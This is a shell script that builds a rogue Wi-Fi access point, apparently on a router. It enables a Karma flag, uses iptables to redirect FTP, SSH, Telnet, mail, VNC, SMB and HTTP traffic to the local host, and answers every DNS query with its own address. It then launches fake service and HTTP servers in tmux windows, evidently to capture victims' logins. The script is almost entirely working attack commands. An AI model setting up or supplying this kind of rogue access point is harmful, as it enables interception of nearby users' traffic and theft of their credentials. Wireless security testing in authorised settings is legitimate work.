#kill $(ps | sed -n 's/ \([0-9]\{3,\}\).*root.*dnsmasq.*5353.*/\1/p' | head -n 1)

echo -e "Restarting network, you will be disconnected. If using wifi, connect to the new wifi network. Connect to tmux session \"rougeAP\""
echo "tmux a -t rougeAP"

echo "
trap cleanup INT

cleanup() {

        echo -e "Restarting network, you will be disconnected. If using wifi, connect to the new wifi network."
        /etc/init.d/network restart

        kill $(ps | sed -n 's/ \([0-9]\{3,\}\).*root.*dnsmasq.*5353.*/\1/p' | head -n 1)

        tmux kill-session -t rougeAP


}

touch /etc/flag/karma
/etc/init.d/network restart


iptables -t nat -A PREROUTING -p tcp --destination-port 21 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 5900 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 110 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 25 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 143 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 23 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 22 -j DNAT --to 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 445 -j DNAT --to 192.168.1.1


iptables -t nat -A PREROUTING -p udp --destination-port 53 -j DNAT --to 192.168.1.1:5353

tmux set -t rougeAP -g status-right '#[fg=black]#(status -c)'

tmux new-window -t rougeAP:1 -n arpd 'arpd -i br-router -d & sleep 999999 ; kill $(pidof arpd) 2>/dev/null'
tmux new-window -t rougeAP:2 -n dnsmasq 'dnsmasq -p 5353 -A /#/192.168.1.1 -q -d 2>&1'
#tmux new-window -t rougeAP:3 -n nbsn_server 'python /root/nbsn_server.py 192.168.1.1'
tmux new-window -t rougeAP:3 -n dhcp_leases 'python /root/dhcp-watcher.py'
tmux new-window -t rougeAP:4 -n fake_servers 'cd /mnt/data/FakeServers/ && python main.py'
tmux new-window -t rougeAP:5 -n http_servers 'cd /mnt/data/FakeHTTPServers/ && python http.py'

tmux setw -t rougeAP -g monitor-activity on

tmux new-window -t rougeAP:6 -n hostapd 'logread -f | grep -o \"hostapd.*\"'
tmux new-window -t rougeAP:7 -n dnsmasq-dhcp 'logread -f | grep -o \"dnsmasq-dhcp.*\"'
tmux new-window -t rougeAP:8 -n logread 'logread -f | grep -v -e dnsmasq -e arpd -e hostapd'

cd /root/

sleep 999999

" > /tmp/rougeAP_tmux.sh

tmux kill-session -t rougeAP 2>/dev/null
tmux new-session -d -s rougeAP -n main 'sh /tmp/rougeAP_tmux.sh'
